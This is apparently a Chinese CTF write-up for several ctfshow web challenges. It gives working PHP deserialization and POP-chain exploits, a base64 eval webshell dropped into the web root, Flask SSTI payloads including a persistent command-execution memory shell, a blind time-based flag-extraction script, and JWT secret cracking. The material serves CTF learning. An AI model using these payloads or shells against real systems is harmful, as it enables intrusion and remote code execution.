+++
title = "ctfshow击剑杯"
slug = "ctfshow-fencing-cup"
description = "刷"
date = "2025-01-11T14:20:29"
lastmod = "2025-01-11T14:20:29"
image = ""
license = ""
categories = ["ctfshow"]
tags = ["php", "ssti"]
+++

## 给我看看

```php
<?php
header("Content-Type: text/html;charset=utf-8");
error_reporting(0);
require_once("flag.php");

class whoami{
    public $name;
    public $your_answer;
    public $useless;

    public function __construct(){
        $this->name='ctfshow第一深情';
        $this->your_answer='Only you know';
        $this->useless="I_love_u";
    }

    public function __wakeup(){
        global $flag;
        global $you_never_know;
        $this->name=$you_never_know;

        if($this->your_answer === $this->name){
            echo $flag;
        }
    }
}

$secret = $_GET['s'];
if(isset($secret)){
    if($secret==="给我看看!"){
        extract($_POST);
        if($secret==="给我看看!"){    
            die("<script>window.alert('这是不能说的秘密');location.href='https://www.bilibili.com/video/BV1CW411g7UF';</script>");
        }
        unserialize($secret);
    }
}else{
    show_source(__FILE__);
}
```

先赋值然后就`if`，进来就看到可以进行参数覆盖，绕过一下才可以进行反序列化，不过这个绕过很简单，随便写点啥即可，强等于才可以获得`flag`，这里直接进行引用就可以了

```php
<?php
class whoami{
    public $name;
    public $your_answer;
    public $useless;

    public function __construct(){
        $this->your_answer=&$this->name;
    }
}
echo serialize(new whoami());
```

```http
POST /?s=%E7%BB%99%E6%88%91%E7%9C%8B%E7%9C%8B! HTTP/1.1
Host: 4138c4c1-2ab2-49bb-b09c-a70b15bb4511.challenge.ctf.show
Content-Length: 130
Pragma: no-cache
Cache-Control: no-cache
Sec-Ch-Ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Origin: https://4138c4c1-2ab2-49bb-b09c-a70b15bb4511.challenge.ctf.show
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: https://4138c4c1-2ab2-49bb-b09c-a70b15bb4511.challenge.ctf.show/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Priority: u=0, i
Connection: close

secret=O%3A6%3A%22whoami%22%3A3%3A%7Bs%3A4%3A%22name%22%3BN%3Bs%3A11%3A%22your_answer%22%3BR%3A2%3Bs%3A7%3A%22useless%22%3BN%3B%7D
```

## easyPOP

```php
<?php 
highlight_file (__FILE__);
error_reporting(0);
class action_1{
    public $tmp;
    public $fun = 'system';
    public function __call($wo,$jia){
        call_user_func($this->fun);
    }
    public function __wakeup(){
        $this->fun = '';
        die("阿祖收手吧，外面有套神");
    }
    public function __toString(){
        return $this->tmp->str;
    }
}

class action_2{
    public $p;
    public $tmp;
    public function getFlag(){
        if (isset($_GET['ctfshow'])) {
            $this->tmp = $_GET['ctfshow'];
        }
        system("cat /".$this->tmp);
    }
    public function __call($wo,$jia){
        phpinfo();
    }
    public function __wakeup(){
        echo "<br>";
        echo "php版本7.3哦，没有人可以再绕过我了";
        echo "<br>";
    }
    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

class action_3{
    public $str;
    public $tmp;
    public $ran;
    public function __construct($rce){
        echo "送给你了";
        system($rce);
    }
    public function __destruct(){
        urlencode($this->str);
    }
    public function __get($jia){
        if(preg_match("/action_2/",get_class($this->ran))){
            return "啥也没有";
        }
        return $this->ran->$jia();
    }
}

class action_4{
    public $ctf;
    public $show;
    public $jia;
    public function __destruct(){
        $jia = $this->jia;
        echo $this->ran->$jia;
    }
    public function append($ctf,$show){
        echo "<br>";
        echo new $ctf($show);
    }
    public function __invoke(){
        $this->append($this->ctf,$this->show);
    }
}
if(isset($_GET['pop'])){
    $pop = $_GET['pop'];
    $output = unserialize($pop);
    if(preg_match("/php/",$output)){
            echo "套神黑进这里并给你了一个提示：文件名是f开头的形如fA6_形式的文件";
            die("不可以用伪协议哦");
        }
}
```

看着好长，好久没看过这么长的了，pop链子是这样(今天不看了，头晕😪)

---

找了一条利用链，既可以直接调用`system`，也可以调用原生类

```
action_3::__destruct()->action_1::__toString()->action_2::__get()->action_4::__invoke()->action_4::append()->action_3::__construct()
```

写出`poc`

```php
<?php 

class action_1{
    public $tmp;
    public $fun = 'system';
}

class action_2{
    public $p;
    public $tmp;
}

class action_3{
    public $str;
    public $tmp;
    public $ran;
}

class action_4{
    public $ctf;
    public $show;
    public $jia;
}

$a=new action_3();
$a->str=new action_1();
$a->str->tmp=new action_2();
$a->str->tmp->p=new action_4();
$a->str->tmp->p->ctf='action_3';
$a->str->tmp->p->show='ls';
echo serialize($a);
```

但是死活找不到于是打算写个木马

```
echo "PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg=="|base64 -d > /var/www/html/shell.php
```

![1](QQ20250111-152852.jpg)

## 谁是CTF之王？

据说输入框是可以链起来的，这里就要扫一下了

```
dirsearch -u https://0c3f9caa-9f40-49dd-bfdf-65f383984dcf.challenge.ctf.show/
```

拿到了路由`/source`

```python
from flask import Flask, render_template_string, request, send_from_directory

app = Flask(__name__)

@app.route('/')
def index():
    return send_from_directory('html', 'index.html')

@app.route('/ssti.html')
def ssti():
    return send_from_directory('html', 'ssti.html')

@app.route('/madlib', methods=['POST'])
def madlib():
    if len(request.json) == 5:
        verb = request.json.get('verb')
        noun = request.json.get('noun')
        adjective = request.json.get('adjective')
        person = request.json.get('person')
        place = request.json.get('place')
        params = [verb, noun, adjective, person, place]
        
        if any(len(i) > 21 for i in params):
            return 'your words must not be longer than 21 characters!', 403
        
        madlib = (
            f'To find out what this is you must {verb} the internet then get to the '
            f'{noun} system through the visual MAC hard drive and program the open-source '
            f'but overriding the bus won\'t do anything so you need to parse the online '
            f'SSD transmitter, then index the neural DHCP card {adjective}. '
            f'{person} taught me this trick when we met in {place} allowing you to download '
            f'the knowledge of what this is directly to your brain.'
        )
        return render_template_string(madlib)
    
    return 'This madlib only takes five words', 403

@app.route('/source')
def show_source():
    return send_from_directory('/app/', 'app.py')

if __name__ == '__main__':
    app.run('0.0.0.0', port=80)

```

每个关键词长度限制为21，并且是模版渲染，所以可以打ssti，利用`set`进行关键词的拼接即可

```python
import requests
url="http://0c3f9caa-9f40-49dd-bfdf-65f383984dcf.challenge.ctf.show/madlib"

poc={
    "verb":"{%set x=cycler%}",
    "noun":"{%set x=x.__init__%}",
    "adjective":"{%set x=x.__globals__",
    "person":"os.popen('cat f*')%}",
    "place":"{{x.read()}}"
}
r=requests.post(url=url,json=poc)
print(r.text)
```

因为cycler的很短所以直接用的这个，进行拼接即可，其中这个poc就是测试得到的，如果不这么写，就不满足要求了，无法绕过了

## 近在眼前

```python
from flask import Flask, render_template_string, request
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

# 创建 Flask 应用实例
app = Flask(__name__)

# 设置速率限制器
limiter = Limiter(
    app,
    key_func=get_remote_address,          # 基于客户端 IP 地址限制请求
    default_limits=["10000 per hour"]     # 设置默认限制为每小时 10,000 次请求
)

# 路由一：显示当前源代码
@limiter.limit("5/second", override_defaults=True)  # 每秒最多允许 5 次请求
@app.route('/')
def index():
    # 读取并返回当前源代码，以 HTML 格式显示
    return (
        "\x3cpre\x3e\x3ccode\x3e%s\x3c/code\x3e\x3c/pre\x3e"
    ) % open(__file__).read()  # 读取当前文件并嵌入到 HTML 模板中

# 路由二：提供 SSTI 检测功能
@limiter.limit("5/second", override_defaults=True)  # 每秒最多允许 5 次请求
@app.route('/ssti')
def check():
    # 读取 flag 值（从文件 /app/flag.txt 中）
    flag = open("/app/flag.txt", 'r').read().strip()
    
    # 检查是否存在输入参数 'input'
    if "input" in request.args:
        query = request.args["input"]  # 获取用户的输入
        render_template_string(query)  # 使用 render_template_string 渲染输入（存在安全风险）
        return "Thank you for your input."  # 返回感谢消息

    return "No input found."  # 如果没有提供 'input' 参数，返回提示信息

# 启动 Flask 应用
app.run('0.0.0.0', 80)  # 监听所有主机地址，使用 80 端口
```

进去之后得到源码，我觉得可以打一波内存马，当然盲注也是可以的

```
ssti?input{{url_for.__globals__['__builtins__']['eval']("app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)",{'request':url_for.__globals__['request'],'app':url_for.__globals__['current_app']})}}
```

然后直接拿`shell`即可`?cmd=ls`，然后再来写个盲注脚本，使用`cut`进行切片

```python
if [ `cut -c 1 /app/flag.txt` = \"c\" ];then sleep 2;fi'
```

这if还需要写结束语句，并且其中进行替换即可

```python
import requests as req
import time

char_set = "1234567890abcdefghijklmnopqrstuvwxyz-{}"
sess = req.session()
flag = ""
for i in range(1, 46):
    for c in char_set:
        url = r"""http://56372510-315a-4d16-916d-28354adc4c0a.challenge.ctf.show/ssti?input={{lipsum.__globals__.__builtins__.eval("__import__('os').popen('if [ `cut -c %d /app/flag.txt` = \"%s\" ];then sleep 2;fi').read()")}}""" % (
            i, c)
        time.sleep(0.2)
        resp = sess.get(url)
        if resp.elapsed.seconds >= 2:
            print(c)
            flag+=c
            break
print(flag)
```

## 通关大佬

有个`jwt`，进行密钥爆破，安装一个工具[jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)

```
sudo apt install gcc
sudo apt install make
sudo apt install libssl-dev
make
```

现在就可以使用了

```
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoidXNlciIsImV4cCI6MTczNjU4NjY4Nn0.Bfbh5fr6StlgmBIxQQgmj_8GcLQh-OvcPp9_Z9VRrAU
```

得到密码为`12345`，伪造成admin之后进入发现是一个编辑框，然后随便发了一点东西就发现这个东西token直接失效了，也就是说要一直换token了，但是那个编辑框的漏洞还没有找到，后面看官方wp发现是ssti，进行拼接，条件说一下

- <通关人>没任何过滤，但有长度限制，只能25个字符以内
- <通关感言>有较严格的过滤，包括下划线、单双引号、request、中括号、百分号等一些关键字符
- 导致只通过其中一个输入框无法getshell，需要多个输入框进行配合getshell

这里选择了通过<通关人>和<通关感言>进行配合`getshell`，而其中比较重要的就是利用外带参数来利用了，cookie放我们伪造好的时间肯定够，并且登录之后会自动重定向到`edit`，这里才有cookie，所以脚本不是很好写，我就直接写poc了

```
/edit?a=__init__&b=__globals__&c=__getitem__&d=os&e=popen&f=cat /f*&g=read

POST：
name={%25set r=request.args%25}&rank=1&speech={{(config|attr(r.a)|attr(r.b))|attr(r.c)(r.d)|attr(r.e)(r.f)|attr(r.g)()}}&time=2021年11月11日
```

就可以拿到flag了

## 简单的验证码

进来得到了密码本，然后听了半天没有听出来，于是使用微信语音转文字，得到验证码`31064126`，进行bp爆破即可，结果一看爆破结果，他喵的，这个验证码，每次都不一样，我服了，只能手动爆破猜了

```
admin
admin888
123456
```

都不对，哎，绷不住了，看了官方wp是一个misc，但是我真的很想要这个100分，于是我决定手动爆破了，爆了十几个发现搞不下去了，太鸡儿难受了，于是开摆
